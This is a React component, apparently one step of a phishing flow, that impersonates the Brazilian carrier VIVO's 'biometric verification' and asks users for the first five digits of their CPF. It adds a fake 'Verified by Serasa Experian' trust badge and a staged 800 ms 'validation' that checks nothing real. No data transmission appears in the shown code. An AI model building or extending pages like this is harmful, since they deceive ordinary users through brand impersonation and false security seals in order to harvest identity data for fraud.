import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { validatePartialCPF } from "@/utils/validation/cpfValidation";
import ReCAPTCHA from "react-google-recaptcha";
import { Lock } from 'lucide-react';

interface CpfVerificationStepProps {
  onNext: () => void;
}

export const CpfVerificationStep = ({ onNext }: CpfVerificationStepProps) => {
  const [cpfDigits, setCpfDigits] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [captchaValue, setCaptchaValue] = useState<string | null>(null);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cpfDigits || cpfDigits.length < 5) {
      toast({
        title: "CPF inválido",
        description: "Por favor, insira os primeiros 5 dígitos do seu CPF/CNPJ.",
        variant: "destructive",
      });
      return;
    }

    if (!captchaValue) {
      toast({
        title: "Verificação necessária",
        description: "Por favor, complete a verificação reCAPTCHA.",
        variant: "destructive",
      });
      return;
    }
    
    try {
      setIsLoading(true);
      
      if (!validatePartialCPF(cpfDigits)) {
        throw new Error("Os dígitos do CPF não são válidos.");
      }
      
      await new Promise(resolve => setTimeout(resolve, 800));
      onNext();
    } catch (error: any) {
      toast({
        title: "Erro na verificação",
        description: error.message || "Ocorreu um erro ao verificar o CPF.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#8425af] text-white p-6">
      <div className="max-w-md mx-auto space-y-8">
        <div className="flex justify-center mb-12">
          <svg width="120" height="48" viewBox="0 0 120 48" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M60 24C60 37.2548 49.2548 48 36 48C22.7452 48 12 37.2548 12 24C12 10.7452 22.7452 0 36 0C49.2548 0 60 10.7452 60 24Z" fill="white"/>
            <path d="M108 24C108 37.2548 97.2548 48 84 48C70.7452 48 60 37.2548 60 24C60 10.7452 70.7452 0 84 0C97.2548 0 108 10.7452 108 24Z" fill="white"/>
          </svg>
        </div>

        <div className="text-center space-y-6">
          <h2 className="text-sm font-light text-white max-w-xs mx-auto line-clamp-3">
            Bem-vindo à verificação biométrica da VIVO. Precisamos confirmar sua identidade para continuar.
          </h2>
          
          <p className="text-xs opacity-80 text-white">
            Biometria: solução segura de identificação digital
          </p>
        </div>
        
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label htmlFor="cpf" className="block text-lg font-medium text-center text-white">
              Insira os primeiros 5 dígitos do seu CPF:
            </label>
            <Input
              id="cpf"
              type="text"
              value={cpfDigits}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 5);
                setCpfDigits(value);
              }}
              placeholder=""
              className="w-full h-9 text-black text-center text-base bg-white"
              maxLength={5}
            />
          </div>

          <div className="flex justify-center">
            <ReCAPTCHA
              sitekey="your-recaptcha-site-key"
              onChange={(value) => setCaptchaValue(value)}
              theme="light"
            />
          </div>

          <div className="flex justify-center mt-8">
            <div className="flex items-center space-x-2 bg-[#8425af] px-4 py-2 rounded-lg">
              <div className="flex items-center">
                <div className="h-5 w-[1px] bg-white mr-2"></div>
                <Lock className="w-5 h-5 text-white" strokeWidth={2.5} />
              </div>
              <span className="text-sm text-white">Verified by</span>
              <span className="font-semibold text-sm text-white">Serasa Experian</span>
            </div>
          </div>
          
          <Button 
            type="submit"
            className="w-full h-11 bg-white text-[#8425af] hover:bg-gray-100 font-medium uppercase"
            disabled={isLoading || !captchaValue || cpfDigits.length < 5}
          >
            {isLoading ? "Validando..." : "Validar"}
          </Button>
        </form>
      </div>
    </div>
  );
};
